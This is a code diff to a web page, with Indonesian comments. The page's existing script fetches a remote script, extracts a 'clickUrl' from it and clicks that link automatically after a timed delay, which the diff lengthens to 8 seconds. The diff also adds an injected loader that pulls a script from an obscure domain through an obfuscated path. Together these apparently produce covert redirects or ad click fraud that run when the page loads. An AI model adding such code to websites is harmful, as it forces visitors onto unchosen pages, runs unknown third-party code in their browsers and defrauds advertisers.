@@ -26,7 +26,7 @@
       if (match && match[1]) {
         const clickUrl = match[1];
         console.log("clickUrl ditemukan:", clickUrl);
-        // Tunggu 9 detik sebelum klik (di tab yang sama)
+        // Tunggu 8 detik sebelum klik (di tab yang sama)
         setTimeout(() => {
           const a = document.createElement("a");
           a.href = clickUrl;            // set tujuan dari clickUrl
@@ -35,12 +35,25 @@
           document.body.appendChild(a);
           a.click();
           a.remove();                   // hapus link supaya bersih
-        }, 4000);
+        }, 8000);
       } else {
         console.warn("clickUrl tidak ditemukan di script");
       }
     })
     .catch(err => console.error("Gagal fetch script:", err));
+</script>
+
+<script>
+(function(orawl){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = orawl || {};
+s.src = "\/\/disfiguredcomment.com\/byXoV.sJdbG_l\/0SYlWmcy\/beRm\/9Xu\/ZuUylUk\/PSTsYH2\/NqTMks1iNcTNcKtVNPjuYd1mO-T_Un1KOfAh";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
 </script>
 
 </body>
